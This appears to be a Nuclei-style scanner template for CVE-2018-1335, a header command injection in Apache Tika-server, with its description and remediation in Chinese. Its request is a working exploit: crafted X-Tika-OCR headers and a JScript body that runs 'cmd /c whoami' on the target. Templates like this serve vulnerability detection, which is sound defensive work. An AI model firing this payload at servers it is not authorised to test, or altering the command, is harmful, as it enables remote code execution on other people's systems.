id: CVE-2018-1335
info:
  name: Apache Tika 1.15-1.17 Header Command Injection
  author:
  - l0ne1y
  description: |-
    Apache Tika-server 命令执行漏洞
    Apache Tika是美国阿帕奇（Apache）软件基金会的一个集成了POI（使用Java程序对Microsoft Office格式文档提供读和写功能的开源函数库）、Pdfbox（读取和创建PDF文档的纯Java类库）并为文本抽取工作提供了统一界面的内容抽取工具集合。

    Apache Tika 1.7版本至1.17版本中存在安全漏洞。攻击者可借助特制的包头利用该漏洞向运行tika-server的服务器的命令行注入命令。（仅影响运行tika-server并对不可信客户端开放的产品）
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E
requests:
- matchers:
  - type: word
    part: header
    words:
    - 'Content-Type: text/csv'
  - type: word
    condition: and
    part: body
    words:
    - org.apache.tika.parser.DefaultParser
    - org.apache.tika.parser.gdal.GDALParse
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/meta'
  method: PUT
  body: var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec("cmd
    /c whoami");
  headers:
    Connection: close
    Content-type: image/jp2
    Expect: 100-continue
    X-Tika-OCRLanguage: //E:Jscript
    X-Tika-OCRTesseractPath: cscript
